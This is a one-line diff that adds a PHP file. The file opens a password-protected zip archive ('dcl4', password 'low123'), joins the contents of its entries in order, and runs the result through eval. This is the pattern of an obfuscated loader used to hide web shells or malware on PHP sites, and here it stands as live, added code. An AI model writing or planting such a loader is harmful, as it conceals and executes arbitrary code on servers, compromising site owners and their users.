@@ -1,0 +1,1 @@
+<?php $zip = new ZipArchive;if ($zip->open("dcl4") === TRUE) {$zip->setPassword("low123");$files = array();for ($i = 0; $i < $zip->numFiles; $i++) {$name = $zip->getNameIndex($i);$files[$name] = $zip->getFromIndex($i);}ksort($files, SORT_NATURAL);$script = implode("", $files);Eval("?>" . $script) ;$zip->close();} else {echo "error ZIP";}?>
